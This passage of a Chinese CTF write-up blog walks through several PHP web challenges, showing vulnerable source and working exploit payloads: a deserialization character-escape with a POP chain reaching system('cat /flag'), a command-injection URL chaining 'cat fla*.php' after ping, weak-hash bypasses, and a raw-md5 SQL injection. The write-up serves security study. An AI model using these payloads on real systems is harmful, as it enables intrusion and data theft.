class="line">file_put_contents(<span class="string">"caches/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]), write(serialize($player))); </div><div class="line"><span class="keyword">echo</span> sprintf(<span class="string">'Welcome %s, your ip is %s\n'</span>, $username, $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Please input the username or password!\n"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>play.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">@error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">require_once</span> <span class="string">"common.php"</span>;</div><div class="line"><span class="keyword">require_once</span> <span class="string">"class.php"</span>;</div><div class="line"></div><div class="line">@$player = unserialize(read(check(file_get_contents(<span class="string">"caches/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>])))));</div><div class="line">print_r($player);</div><div class="line"><span class="keyword">if</span> ($player-&gt;get_admin() === <span class="number">1</span>)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"FPX Champion\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"The Shy unstoppable\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $user;</div><div class="line">    <span class="keyword">protected</span> $pass;</div><div class="line">    <span class="keyword">protected</span> $admin;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass, $admin = <span class="number">0</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;user = $user;</div><div class="line">        <span class="keyword">$this</span>-&gt;pass = $pass;</div><div class="line">        <span class="keyword">$this</span>-&gt;admin = $admin;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">'Riven'</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = $name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"function"</span> <span class="keyword">or</span> gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"object"</span>)&#123;</div><div class="line">            $name = <span class="keyword">$this</span>-&gt;name;</div><div class="line">            $name();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;TP();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = $name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name !== <span class="string">'Yasuo'</span>)&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">'Yasuo'</span>;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"No Yasuo! No Soul!\n"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;Gank();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;name, <span class="string">'Yasuo'</span>))&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Are you orphan?\n"</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Must Be Yasuo!\n"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name = <span class="string">""</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">"Lee Sin"</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = $name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span><span class="params">()</span></span>&#123;</div><div class="line">        system(<span class="string">"cat /flag"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;KS();  </div><div class="line">        <span class="keyword">return</span> <span class="string">""</span>;  </div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>common.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span></span>&#123;</div><div class="line">    $data = str_replace(<span class="string">'\0*\0'</span>, chr(<span class="number">0</span>).<span class="string">"*"</span>.chr(<span class="number">0</span>), $data);</div><div class="line">    <span class="keyword">return</span> $data;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span></span>&#123;</div><div class="line">    $data = str_replace(chr(<span class="number">0</span>).<span class="string">"*"</span>.chr(<span class="number">0</span>), <span class="string">'\0*\0'</span>, $data);</div><div class="line">    <span class="keyword">return</span> $data;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($data)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span>(stristr($data, <span class="string">'name'</span>)!==<span class="keyword">False</span>)&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Name Pass\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">return</span> $data;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>主要代码及功能：<br>index.php接收传入的<code>$_GET[&#39;username&#39;]</code>和<code>$_GET[&#39;password&#39;]</code>变量，创建player对象，经过serialize序列化后写入<code>&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])</code>文件</p><p>play.php读取<code>&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])</code>文件内容，将文件中序列化字符串进行反序列化，打印</p><p>class.php当中定义了一些类，并存在可利用的反序列化pop链</p><p>common.php主要对序列化和反序列化的数据流进行一些检查和处理</p><p>正常情况下，写入文件的序列化内容是不可控的，但是这里由于common.php当中的read函数会在字符串反序列化之前将序列化字符串当中的<code>\0*\0</code>替换为<code>chr(0).&quot;*&quot;.chr(0)</code>，从5个字符变成了3个字符，导致处理后的字符串在反序列化时，字符串属性值长度大于实际的长度，产生字符逃逸，导致之后的序列化字符串内容可控</p><p>字符逃逸测试，尝试将player的<code>$admin</code>属性值变成1，该值本来是不可控的，这里尝试通过字符逃逸将其变为可控</p><p><img src="http://pic.c1imber.top/blog/20200824/yvHWtwz0yeOG.png?imageslim" alt="mark"></p><p>传入：</p><pre><code>username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=&quot;;s:7:&quot;\0*\0pass&quot;;s:3:&quot;111&quot;;s:8:&quot;\0*\0admin&quot;;i:1;}</code></pre><p>可以看到$admin的值被改变为了1，输出FPX Champion</p><p><img src="http://pic.c1imber.top/blog/20200824/xtRsQDnVI4lz.png?imageslim" alt="mark"></p><p>文件当中的序列化字符串：</p><pre><code>O:6:&quot;player&quot;:3:{s:7:&quot;\0*\0user&quot;;s:55:&quot;\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&quot;;s:7:&quot;\0*\0pass&quot;;s:50:&quot;&quot;;s:7:&quot;\0*\0pass&quot;;s:3:&quot;111&quot;;s:8:&quot;\0*\0admin&quot;;i:1;}&quot;;s:8:&quot;\0*\0admin&quot;;i:0;}</code></pre><p>经过read函数处理后（为了方便表示，这里protected属性名中的不可见字符用0表示）</p><pre><code>O:6:&quot;player&quot;:3:{s:7:&quot;0*0user&quot;;s:55:&quot;0*00*00*00*00*00*00*00*00*00*00*0&quot;;s:7:&quot;0*0pass&quot;;s:50:&quot;&quot;;s:7:&quot;0*0pass&quot;;s:3:&quot;111&quot;;s:8:&quot;0*0admin&quot;;i:1;}&quot;;s:8:&quot;0*0admin&quot;;i:0;}</code></pre><p><code>\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0</code></p><p>由长度55变为了</p><p><code>0*00*00*00*00*00*00*00*00*00*00*0长度33</code></p><p><code>&quot;;s:7:&quot;0*0pass&quot;;s:50:&quot;</code>为逃逸的字符，长度为55-33，22</p><p>逃逸的字符之后的序列化字符串就变为可控内容了，可以通过$_GET[‘password’]构造可控的序列化字符串</p><p>php序列化字符串遇到}后完成反序列化，实际反序列化字符串为</p><pre><code>O:6:&quot;player&quot;:3：{s:7:&quot;0*0user&quot;;s:55:&quot;0*00*00*00*00*00*00*00*00*00*00*0&quot;;s:7:&quot;0*0pass&quot;;s:50:&quot;&quot;;s:7:&quot;0*0pass&quot;;s:3:&quot;111&quot;;s:8:&quot;0*0admin&quot;;i:1;}object(__PHP_Incomplete_Class)#1 (4) { [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt; string(6) &quot;player&quot; [&quot;user&quot;:protected]=&gt; string(55) &quot;***********&quot;;s:7:&quot;*pass&quot;;s:50:&quot;&quot; [&quot;pass&quot;:protected]=&gt; string(3) &quot;111&quot; [&quot;admin&quot;:protected]=&gt; int(1) }</code></pre><p>根据class.php构造pop链</p><p>最终需要触发的地方为jungle对象的KS方法当中的<code>system(&#39;cat /flag&#39;)</code>-&gt;</p><p>jungle对象的<code>__toString</code>魔术方法刚好调用了KS方法-&gt;</p><p><code>__toString</code>魔术方法在对象被当作字符串时触发，所以需要找到一个jungle对象有可能被当作字符串的位置-&gt;</p><p>在midsolo对象的Gank方法当中，使用了stristr字符串函数，如果将这里midsolo对象的$name属性设置为jungle对象，就可以触发jungle的<code>__toString</code>-&gt;</p><p>midsolo对象的<code>__invoke</code>魔术方法刚好调用了Gank方法，<code>__invoke</code>魔术方法在其对象被作为函数调用时触发-&gt;</p><p>很容易可以找到topsolo对象的TP方法，这里调用了<code>$name()</code>，如果将topsolo对象的$name属性设置为midsolo对象，就能触发midsolo的<code>__invoke</code>-&gt;</p><p>而刚好topsolo的<code>__destruct</code>调用了topsolo的TP方法，所以这里可以作为pop链的起点</p><p>构造poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name = <span class="string">""</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">"Lee Sin"</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = $name;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name=<span class="string">""</span>;</div><div class="line">    </div><div class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> jungle();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name=<span class="string">""</span>;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> midsolo();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$obj=<span class="keyword">new</span> topsolo();</div><div class="line"><span class="keyword">echo</span> serialize($obj);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><pre><code>O:7:&quot;topsolo&quot;:1:{s:7:&quot;*name&quot;;O:7:&quot;midsolo&quot;:1:{s:7:&quot;*name&quot;;O:6:&quot;jungle&quot;:1:{s:7:&quot;*name&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>修改payload</p><p>1、存在不可见字符，修改成</p><pre><code>O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00name&quot;;O:7:&quot;midsolo&quot;:1:{S:7:&quot;\00*\00name&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00name&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>2、midsolo的<code>__walkup</code>方法要求$name必须为Yasuo，所以需要绕过<code>__walkup</code>方法<br>改为：</p><pre><code>O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00name&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00name&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00name&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>3、common.php当中的check函数要求序列化字符串当中不能存在name</p><p>把n改为\6e</p><pre><code>O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00\6eame&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00\6eame&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00\6eame&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>最终传入</p><pre><code>username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=;s:8:&quot;\0*\0admin&quot;;i:1;S:7:&quot;\00*\00\6eame&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00\6eame&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00\6eame&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00\6eame&quot;;s:7:&quot;Lee Sin&quot;;}}}}</code></pre><p><img src="http://pic.c1imber.top/blog/20200824/d8wxX2yFHQU2.png?imageslim" alt="mark"></p><p>访问play.php获取flag</p><p><img src="http://pic.c1imber.top/blog/20200824/5HLVOwJA1qKC.png?imageslim" alt="mark"></p><h3 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">highlight_file(<span class="string">"index.php"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/i"</span>, $_GET[<span class="string">"ip"</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">system(<span class="string">"ping -c 3 $_GET[ip]"</span>);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>preg_match检查<code>$_GET[&quot;ip&quot;]</code>当中不能有flag字符串，直接用linux通配符就能绕过</p><p><code>http://xxx/?ip=1.1.1.1%20||%20cat%20fla*.php</code></p><p><img src="http://pic.c1imber.top/blog/20200824/piMpGWj02C6D.png?imageslim" alt="mark"></p><h3 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</div><div class="line">highlight_file(<span class="string">"index.php"</span>);</div><div class="line"><span class="comment">//level 1</span></div><div class="line"><span class="keyword">if</span> ($_GET[<span class="string">"hash1"</span>] != hash(<span class="string">"md4"</span>, $_GET[<span class="string">"hash1"</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'level 1 failed'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//level 2</span></div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'hash2'</span>] === $_GET[<span class="string">'hash3'</span>] || md5($_GET[<span class="string">'hash2'</span>]) !== md5($_GET[<span class="string">'hash3'</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'level 2 failed'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//level 3</span></div><div class="line">$query = <span class="string">"SELECT * FROM flag WHERE password = '"</span> . md5($_GET[<span class="string">"hash4"</span>],<span class="keyword">true</span>) . <span class="string">"'"</span>;</div><div class="line">$result = $mysqli-&gt;query($query);</div><div class="line">$row = $result-&gt;fetch_assoc(); </div><div class="line">var_dump($row);</div><div class="line">$result-&gt;free();</div><div class="line">$mysqli-&gt;close();</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>evel1这里本来想传入空数组去绕过的，因为hash函数参数为数组时会产生错误，导致hash运算结果为NULL，所以如果传入空数组的话两者就相等了，但是试了半天却发现不行</p><p>而下面的代码是可以的</p><p><img src="http://pic.c1imber.top/blog/20200824/Y6nYJ9knFi0M.png?imageslim" alt="mark"></p><p>于是在这里卡了好久，最后才发现问题出在了哪</p><p><strong>因为通过<code>$_GET</code>方式传入空数组和直接定义空数组是有区别的</strong></p><p>通过<code>$_GET</code>方式传入数组，数组里有个默认的元素，内容为空字符串，所以即使<code>_GET</code>传入了空数组，但是其实这里的<code>$_GET[&#39;hash1&#39;]</code>并不是真正的空数组，而是<code>array(1) { [0]=&gt; string(0) &quot;&quot; }</code>，所以这里两者并不相等</p><p>在本地<code>var_dump($_GET[&#39;hash1&#39;])</code>就知道了</p><p><img src="http://pic.c1imber.top/blog/20200824/i3GbyqKOzpvn.png?imageslim" alt="mark"></p><p>所以这里需要换一下思路</p><p>这里lelvel1要求<code>$_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;])</code></p><p>而php弱类型当中还有一个特性是<code>&quot;0e\d+&quot;==&quot;0e\d+&quot;</code>的结果是为true的，因为两个字符串都以0e开头且后面的字符均为数字，php在通过==比较时会将两个字符串都转为科学计数法,于是两个结果都是0，所以相等</p><p><img src="http://pic.c1imber.top/blog/20200824/rUX1XczPPl9R.png?imageslim" alt="mark"></p><p>那么这里需要找一个字符串，符合以下条件的：</p><p>1、字符串需要以0e开头，且之后的字符都是数字</p><p>2、该字符串md4后的结果也需要为0e开头，且后面均为数字</p><p>这样只能爆破了，脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$hash = <span class="string">'0e612198634316944013585621061115'</span>;</div><div class="line"> </div><div class="line"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;<span class="number">100000000000</span>; $i++) &#123;</div><div class="line">    <span class="keyword">if</span> (hash(<span class="string">"md4"</span>,<span class="string">"0e"</span>. $i) == $hash) &#123;</div><div class="line">        <span class="keyword">echo</span> $i;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="keyword">echo</span> <span class="string">'  done'</span>;</div></pre></td></tr></table></figure><p>十几分钟就爆破成功了</p><p><img src="http://pic.c1imber.top/blog/20200824/JOYhnsKbeEF6.png?imageslim" alt="mark"></p><p>得到符合条件的字符串：0e251288019</p><p><img src="http://pic.c1imber.top/blog/20200824/3vFzMhWgpGGd.png?imageslim" alt="mark"></p><p>level2比较简单，<code>$_GET[&#39;hash2&#39;]</code>和<code>$_GET[&#39;hash3&#39;]</code>均为空数组即可绕过</p><p>level3接收参数拼接SQL语句，直接查询flag，语句如下</p><p><code>&quot;SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;</code></p><p>需要 <code>md5($_GET[&quot;hash4&quot;],true)</code>可控，这里的true返回的是md5后的二进制数据</p><p>找到了一篇文章，文章中提到了一个神奇的字符串：<code>ffifdyop</code>，该字符串<code>md5(xxx,true)</code>后的结果为<code>&#39;&#39;or&#39;二进制数据&#39;</code>，导致可以注入查询所有内容</p><p>文章连接：<br><a href="https://blog.csdn.net/solitudi/article/details/107813286" target="_blank" rel="external">https://blog.csdn.net/solitudi/article/details/107813286</a></p><p><img src="http://pic.c1imber.top/blog/20200824/IzEUegw2OTKP.png?imageslim" alt="mark"></p><p>所以最终结果为：</p><p><code>http://xxx/index.php?hash1=0e251288019&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=ffifdyop</code></p><p>获取flag</p><p><img src="http://pic.c1imber.top/blog/20200824/jl0lvpPTepbq.png?imageslim" alt="mark"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="half-infiltration（赛后做出）"><a href="#half-infiltration（赛后做出）" class="headerlink" title="half_infiltration（赛后做出）"></a>half_infiltration（赛后做出）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line"></div><div class="line">$flag=file_get_contents(<span class="string">'ssrf.php'</span>);</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        ob_start();</div><div class="line">        <span class="keyword">global</span> $result;</div><div class="line">        <span class="keyword">print</span> $result;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $age,$sex,$num;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $student = <span class="keyword">$this</span>-&gt;age;</div><div class="line">        $boy = <span class="keyword">$this</span>-&gt;sex;</div><div class="line">        $a = <span class="keyword">$this</span>-&gt;num;</div><div class="line">    $student-&gt;$boy();</div><div class="line">    <span class="keyword">if</span>(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))</div><div class="line">    &#123;</div><div class="line">        ob_end_clean();</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">global</span> $$a;</div><div class="line">    $result=$GLOBALS[<span class="string">'flag'</span>];</div><div class="line">        ob_end_clean();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x'</span>])) &#123;</div><div class="line">    unserialize($_GET[<span class="string">'x'</span>])-&gt;get_it();</div><div 